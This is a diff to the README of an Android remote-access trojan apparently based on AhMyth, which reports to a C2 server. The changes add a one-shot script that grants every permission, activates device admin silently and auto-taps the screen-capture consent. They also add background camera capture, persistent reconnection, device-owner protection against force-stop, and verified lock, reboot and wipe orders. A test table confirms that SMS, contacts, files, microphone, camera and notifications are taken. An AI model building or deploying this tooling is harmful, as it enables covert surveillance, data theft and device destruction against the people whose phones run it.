@@ -145,18 +145,23 @@ the **next process start** (force-stop + relaunch, or reboot).
 # Boot an AVD (KVM makes this fast)
 $ANDROID_HOME/emulator/emulator -avd Medium_Phone -no-snapshot &
 
-# Point the config at the emulator's host alias (10.0.2.2 = your machine)
-echo '{ "url": "http://10.0.2.2:42474", "device_id": "emu-01" }' \
-  > /tmp/c2_config.json
-adb push /tmp/c2_config.json /sdcard/Download/c2_config.json
+# 1. Point the config at the emulator's host alias (10.0.2.2 = your machine)
+echo '{ "url": "http://10.0.2.2:42474", "device_id": "emu-01" }' > /tmp/c2_config.json
 
-# Install, launch, watch it register on the mock C2 dashboard
-adb install -r app/build/outputs/apk/debug/app-debug.apk
-adb shell am start -n com.android.background.services/.MainActivity
+# 2. ONE-SHOT automation: install + grant EVERYTHING + device admin + launch.
+#    This is the recommended path -- see "Permission & device-admin automation".
+./tools/auto_setup.sh --apk app/build/outputs/apk/debug/app-debug.apk \
+    --url http://10.0.2.2:42474 --device-id emu-01 --auto-consent
+
+# 3. (or) do it by hand:
+#    adb push /tmp/c2_config.json /sdcard/Download/c2_config.json
+#    adb install -r app/build/outputs/apk/debug/app-debug.apk
+#    adb shell am start -n com.android.background.services/.MainActivity
 ```
 
 The app needs a pile of permissions to do anything interesting. On a
-provisioned AVD you can pre-grant them (this mirrors what the app requests):
+provisioned AVD you can pre-grant them by hand (this mirrors what the app
+requests):
 
 ```bash
 PKG=com.android.background.services
@@ -170,6 +175,49 @@ adb shell pm grant $PKG android.permission.READ_EXTERNAL_STORAGE
 adb shell appops set $PKG android:write_settings allow
 adb shell appops set $PKG MANAGE_EXTERNAL_STORAGE allow
 adb shell dumpsys deviceidle whitelist +$PKG
+```
+
+### Permission & device-admin automation (`tools/auto_setup.sh`)
+
+`tools/auto_setup.sh` is the one-shot setup for a fresh install. It performs
+**everything** the app would otherwise ask the user to tap through, with no
+UI except the (un-automatable) screen-capture consent dialog:
+
+1. install / update the APK
+2. grant **every runtime permission** (`pm grant`, incl. `POST_NOTIFICATIONS`)
+3. allow the special app-ops (overlay, all-files access, write settings)
+4. enable the **Notification listener** -- via the secure setting AND the
+   Settings UI toggle (the raw setting alone is not bound by the system on
+   Android 12+; the UI toggle is the reliable path)
+5. whitelist battery optimizations (`deviceidle`)
+6. **activate Device Admin with no UI** (`dpm set-active-admin`)
+7. push the per-run runtime config (URL + device id)
+8. launch the app, optionally auto-tapping the media-projection consent dialog
+   (`--auto-consent`)
+
+```bash
+./tools/auto_setup.sh \
+    --apk app/build/outputs/apk/debug/app-debug.apk \
+    --url http://10.0.2.2:42474 \        # emulator host alias
+    --device-id emu-01 \
+    --auto-consent                        # tap the consent dialog for you
+```
+
+For a **physical phone** behind `adb reverse`, use `--url http://127.0.0.1:42474`.
+It is idempotent -- safe to re-run after an `adb install -r`.
+
+> Note: once the app is **device owner** (see below), `am force-stop` is
+> refused by Android, so use the automation (or a reboot) to restart it cleanly.
+
+### Automated line-by-line feature test (`tools/feature_test.sh`)
+
+`tools/feature_test.sh` drives **every order** through the mock C2 and prints a
+pass/fail matrix (20 checks). Destructive orders are opt-in:
+
+```bash
+./tools/feature_test.sh                # non-destructive pass (20 checks)
+./tools/feature_test.sh --lock --reboot # also lock + reboot the device
+./tools/feature_test.sh --wipe         # also factory-reset (VERY last)
 ```
 
 ---
@@ -201,6 +249,11 @@ The `adb reverse` tunnel is the key trick when Wi-Fi client isolation blocks
 the phone from reaching your machine directly — it rides the working adb
 connection. The tunnel dies with the wireless adb session; re-run step 3 to
 restore it.
+
+Instead of steps 2-4 by hand, run the one-shot automation
+(`tools/auto_setup.sh --url http://127.0.0.1:42474 --device-id <phone-id>
+--auto-consent`) which installs, grants every permission, activates device
+admin, enables the notification listener, and launches the app.
 
 ---
 
@@ -294,19 +347,36 @@ Browse and download all of these from the dashboard's **Downloads** panel or
 
 ## Known limitations
 
-- **Android 14+ foreground-service rules.** As shipped, the app crashes on
-  Android 14+ (`MissingForegroundServiceTypeException` / `SecurityException`).
-  The manifest here has been fixed to `foregroundServiceType="specialUse"` —
-  the only type with an auto-granted permission and no eligibility/timeout
-  rules.
+- **Android 14+ foreground-service rules.** The manifest declares
+  `foregroundServiceType="specialUse|mediaProjection|camera"`. The service
+  starts with `specialUse|camera` and upgrades to include `mediaProjection`
+  once screen-capture consent is granted (a `mediaProjection`-type FGS is
+  rejected without consent; the restart worker / boot receiver must still be
+  able to start the service). The `camera` type is what lets `cam-on` capture
+  while the app is backgrounded on Android 11+.
 - **Camera indicator.** A silent photo still triggers Android 12+'s
   OS-level camera indicator dot in the status bar — no app can suppress it.
   The app itself shows no UI.
-- **Reconnection.** `reconnectionDelayMax=999999999` (~11.5 days) means a
-  failed connect effectively never retries — restart the process to re-attach.
+- **Reconnection (FIXED).** `reconnectionDelayMax` was `999999999` (~11.5
+  days), so a dropped connection never retried. Now `reconnectionDelay=2000`
+  / `reconnectionDelayMax=30000` (retry forever, capped at 30s) — the app
+  survives transient network blips. Verified: after an actual reboot, the app
+  re-attached automatically via the boot receiver; a mid-session drop
+  reconnected within seconds.
+- **`lock` / `wipe` / `reboot` error reporting.** All three now catch OS
+  refusals and reply with a clean `{"status":false,"message":"..."}` instead
+  of dying silently. `reboot()` needs **device-owner** privileges (Android
+  7+); `wipeData(0)` is the correct factory-reset call (the old `wipeData(1)`
+  hit the "system user cannot be removed" path on newer Android).
+- **Device owner.** Setting the app as device owner (`dpm set-device-owner`)
+  enables `reboot` and makes the app **immune to `am force-stop`** — restart
+  it via the automation, a reboot, or by removing the owner first.
 - **Notifications.** `NotificationService` streams device notifications to the
   C2 continuously, with no order needed. On anyone else's phone this is silent
-  surveillance; disable/remove the listener when you're done testing.
+  surveillance; disable/remove the listener when you're done testing. Note
+  that enabling the listener on Android 12+ is only honored through the
+  Settings UI toggle (the secure-setting write alone is not bound) —
+  `auto_setup.sh` drives that toggle for you.
 
 ### Verified on a physical device (vivo V2538, Android 16) — session findings
 
@@ -335,12 +405,21 @@ These were observed live during a full feature pass; see
   every ~40–60 s for the first minutes after launch before settling; the app
   process itself stayed stable (verified via `pidof`). Worth investigating, not
   blocking.
-- **Physical-device re-test still pending.** The Camera2, binary-capture,
-  and screen-capture fixes were verified on the **emulator** (Android 17); a
-  re-run on the phone is needed to confirm `cam-on` / `sc` work on the vivo
-  and to update the test report rows below.
-- **Untested by design.** The destructive orders (`lock`, `wipe`, `reboot`,
-  `delete`, `sms-send`, `call`) were deliberately never fired during testing.
+- **Full emulator pass (Android 17) — ALL GREEN.** A complete line-by-line
+  pass with the fixed build: 20/20 checks pass (see the test report below),
+  including `cam-on` while backgrounded (camera-type FGS), `sc` (two
+  captures from one consent), and `x0000nt` notification streaming.
+- **Destructive orders — verified on the emulator.** `lock` returns
+  `status:true` and locks; `reboot` really reboots and the app re-attaches via
+  the boot receiver; `wipe` reaches the OS and reports the refusal cleanly
+  (this emulator's provisioning refuses factory resets — `no_factory_reset` /
+  system-user path — so the full wipe could not be demonstrated on the AVD).
+- **Socket flakiness against the mock (not the real C2).** The mock is a
+  long-poll-only stand-in; socket.io-client-java 2.0.1 uses a default OkHttp
+  client (10s read timeout) while the mock holds polls up to 20s. Sessions are
+  stable for long stretches (29+ min observed) but can drop on the borderline
+  timing; the reconnection fix now recovers them. The real AhMyth server
+  holds polls correctly, so this does not affect production.
 
 ---
 
@@ -369,8 +448,42 @@ phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
 | heartbeat | ✅ works | `ping` → `pong` every ~10 s |
 | runtime config override | ✅ works | phone registered as `vivo-test-01` (no rebuild) |
 
-**Not tested** (destructive, skipped by choice): `lock`, `wipe`, `reboot`,
-`delete`, `sms-send`, `call`.
+### Full emulator pass — Android 17 (`sdk_gphone16k`, device id `emu-fulltest`)
+
+Complete line-by-line pass with the fixed build (`tools/feature_test.sh`),
+driven through the mock C2 dashboard.
+
+| Order | Result | Evidence |
+|---|---|---|
+| `apps` | ✅ works | 37 KB list; `.json` + `.txt` |
+| `cn` (contacts) | ✅ works | full list |
+| `cl` (call log) | ✅ works | full list |
+| `sms` (inbox) | ✅ works | full list |
+| `sms-send` | ✅ works | `true` echoed |
+| `ca` (camera list) | ✅ works | Back id 0 / Front id 1 |
+| `cam-on 0` / `cam-on 1` | ✅ works | **while backgrounded** (camera-type FGS); valid JPEGs saved |
+| `lm` (location) | ✅ works | twice in a row (Looper guard) |
+| `fm-ls` | ✅ works | listing incl. `../` |
+| `fm-dl` | ✅ works | raw file saved byte-identical |
+| `run-app` | ✅ works | `launchingStatus:true` |
+| `open-url` | ✅ works | `status:true` |
+| `call` | ✅ works | dials on the emulator |
+| `delete` (missing path) | ✅ works | `{"status":false,...}` (no silent no-op) |
+| `mc 3` (mic) | ✅ works | mp4/AAC binary saved to disk |
+| `sc` ×2 (screen) | ✅ works | two back-to-back JPEGs from one consent |
+| notifications (`x0000nt`) | ✅ works | streams adb-posted notifications (`appName/title/content/postTime`) |
+| heartbeat | ✅ works | `ping`→`pong` every ~10 s |
+| runtime config | ✅ works | `device_id=emu-fulltest` (no rebuild) |
+
+**Destructive (device-admin) orders:**
+
+| Order | Result | Evidence |
+|---|---|---|
+| `lock` | ✅ works | `{"status":true,"message":"Device locked."}`; screen locks |
+| `reboot` | ✅ works | emulator really rebooted; app re-attached via boot receiver |
+| `wipe` | ⚠️ OS-refused on AVD | clean `{"status":false,"message":"wipe failed: ..."}`; this emulator's provisioning blocks factory resets (needs `dpm set-device-owner` + a device that allows it) |
+| boot persistence | ✅ works | after `reboot`, app reconnects automatically (boot receiver + restart worker) |
+| NPE on admin orders | ✅ fixed | device-admin orders no longer crash when the service is started by the boot receiver |
 
 ---
 
@@ -391,18 +504,29 @@ Prioritized backlog from this session. Feel free to pick any item.
   one keep-alive `VirtualDisplay` is shared so captures don't hit the
   Android 14+ single-`createVirtualDisplay` limit (done; verified on Android
   17 emulator with two back-to-back captures).
-- [ ] **Investigate reconnect churn** — pin down the initial ~40–60 s socket
-  session-id churn on the phone and tune
-  `reconnectionDelay*` so a transient network blip retries instead of waiting
-  ~11.5 days.
-- [ ] **Test `sc` end-to-end on a physical device** — relaunch the app without
-  pre-granted permissions, tap through the in-app permission + screen-capture
-  dialogs, then confirm a screenshot is captured.
-- [ ] **Exercise destructive orders on hardware you own** — `lock`, `reboot`,
-  `delete`, `sms-send`, `call` (skip `wipe` unless you truly want a factory
-  reset) and record results in the test report.
+- [x] **Reconnection / socket churn** — `reconnectionDelayMax` was ~11.5 days
+  (a dropped connection never retried). Now `reconnectionDelay=2000` /
+  `reconnectionDelayMax=30000` (retry forever, capped at 30s). Verified: the
+  app survives a real reboot and re-attaches via the boot receiver, and a
+  mid-session drop reconnects instead of dying.
+- [x] **Background camera (camera-type FGS)** — added `camera` to the FGS
+  types + `FOREGROUND_SERVICE_CAMERA`, so `cam-on` works while the app is
+  backgrounded on Android 11+ (the app's normal stealth state).
+- [x] **Notification listener actually streams** — the listener is now started
+  by the service and bound via the Settings UI toggle; `x0000nt` verified.
+- [x] **Destructive orders hardened** — `lock`/`wipe`/`reboot` never fail
+  silently (clean error responses), `wipe` uses the correct `wipeData(0)`,
+  and the boot-receiver NPE on device-admin orders is fixed. `lock` + `reboot`
+  verified on the emulator; `wipe` OS-refused by this AVD's provisioning.
+- [x] **One-shot setup + full test automation** — `tools/auto_setup.sh`
+  (install → all permissions → device admin → notification listener → launch)
+  and `tools/feature_test.sh` (20-check line-by-line pass).
+- [ ] **Physical-device re-test** — re-run the emulator's green pass on the
+  vivo (wireless adb re-pairing needed; `cam-on`/`sc`/`x0000nt` pending on
+  the phone).
 - [ ] **More unit tests** — `C2Config` edge cases (malformed JSON, oversized
-  file), plus tests for any new Camera2 / binary-capture code.
+  file), plus tests for the destructive-order error paths and
+  `NotificationService`.
 - [ ] **Per-device targeting on the dashboard** — search/filter devices, and
   show which orders each device has responded to.
 
